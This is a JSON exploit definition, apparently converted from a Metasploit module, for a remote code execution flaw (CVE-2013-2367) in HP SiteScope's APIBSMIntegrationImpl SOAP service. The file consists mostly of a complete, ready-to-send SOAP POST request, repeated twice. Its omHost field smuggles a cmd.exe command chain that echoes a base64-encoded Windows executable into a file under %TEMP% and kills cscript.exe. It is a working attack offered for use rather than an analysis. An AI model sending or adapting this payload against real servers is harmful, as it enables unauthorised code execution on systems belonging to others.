{
   "variables" : {
      "PATH" : {
         "VALUE" : "/SiteScope/",
         "DESCRIPTION" : "Path to SiteScope"
      }
   },
   "title" : "HP SiteScope Remote Code Execution",
   "payload" : "",
   "description" : "\n\n          This module exploits a code execution flaw in HP SiteScope.\n\n        The vulnerability exists in the opcactivate.vbs script, which\n\n        is reachable from the APIBSMIntegrationImpl AXIS service, and\n\n        uses WScript.Shell.run() to execute cmd.exe with user provided\n\n        data. Note that the opcactivate.vbs component is installed\n\n        with the (optional) HP Operations Agent component. The module\n\n        has been tested successfully on HP SiteScope 11.20 (with HP\n\n        Operations Agent) over Windows 2003 SP2.\n\n      ",
   "method" : "POST",
   "platform" : "WINDOWS",
   "osvdb" : 95824,
   "paths" : [
      "services/APIBSMIntegrationImpl",
      "SiteScope/"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "services/APIBSMIntegrationImpl",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /services/APIBSMIntegrationImpl",
         "HEADERS" : {
            "Content-Type" : "text/xml; charset=UTF-8",
            "SOAPAction" : "\"\""
         },
         "PAYLOAD" : "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:api=\"http://Api.freshtech.COM\"><soapenv:Header/><soapenv:Body><api:runOMAgentCommand soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><in0 xsi:type=\"x-:Map\" xmlns:x-=\"http://xml.apache.org/xml-soap\"><item xsi:type=\"x-:mapItem\"><key xsi:type=\"xsd:string\">omHost</key><value xsi:type=\"xsd:string\">&#x22;127.0.0.1 &#x26;&#x26; echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAIu9ESgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADQdAAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>%TEMP%\\aGTuD.b64 &#x26;&#x26; taskkill /F /IM cscript.exe &#x22;</value></item></in0><in1 xsi:type=\"xsd:string\">OPCACTIVATE</in1></api:runOMAgentCommand></soapenv:Body></soapenv:Envelope>"
      }
   },
   "msf_module" : "hp_sitescope_runomagentcommand",
   "cve" : "CVE-2013-2367",
   "name" : "HpSitescopeRunomagentcommand",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "services/APIBSMIntegrationImpl?",
   "type" : "MSF",
   "informations" : {
      "MSF_MODULE" : "hp_sitescope_runomagentcommand",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/SiteScope/",
            "DESCRIPTION" : "Path to SiteScope"
         }
      },
      "DESCRIPTION" : "\n\n          This module exploits a code execution flaw in HP SiteScope.\n\n        The vulnerability exists in the opcactivate.vbs script, which\n\n        is reachable from the APIBSMIntegrationImpl AXIS service, and\n\n        uses WScript.Shell.run() to execute cmd.exe with user provided\n\n        data. Note that the opcactivate.vbs component is installed\n\n        with the (optional) HP Operations Agent component. The module\n\n        has been tested successfully on HP SiteScope 11.20 (with HP\n\n        Operations Agent) over Windows 2003 SP2.\n\n      ",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "services/APIBSMIntegrationImpl",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /services/APIBSMIntegrationImpl",
            "HEADERS" : {
               "Content-Type" : "text/xml; charset=UTF-8",
               "SOAPAction" : "\"\""
            },
            "PAYLOAD" : "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:api=\"http://Api.freshtech.COM\"><soapenv:Header/><soapenv:Body><api:runOMAgentCommand soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><in0 xsi:type=\"x-:Map\" xmlns:x-=\"http://xml.apache.org/xml-soap\"><item xsi:type=\"x-:mapItem\"><key xsi:type=\"xsd:string\">omHost</key><value xsi:type=\"xsd:string\">&#x22;127.0.0.1 &#x26;&#x26; echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAIu9ESgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADQdAAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>%TEMP%\\aGTuD.b64 &#x26;&#x26; taskkill /F /IM cscript.exe &#x22;</value></item></in0><in1 xsi:type=\"xsd:string\">OPCACTIVATE</in1></api:runOMAgentCommand></soapenv:Body></soapenv:Envelope>"
         }
      },
      "name" : "HpSitescopeRunomagentcommand",
      "PAYLOAD" : "",
      "OSVDB" : 95824,
      "CVE" : "CVE-2013-2367",
      "TITLE" : "HP SiteScope Remote Code Execution",
      "PATH" : "services/APIBSMIntegrationImpl?",
      "METHOD" : "POST",
      "TYPE" : "MSF",
      "PLATFORM" : "WINDOWS",
      "PATHS" : [
         "services/APIBSMIntegrationImpl",
         "SiteScope/"
      ]
   },
   "detection" : {}
}
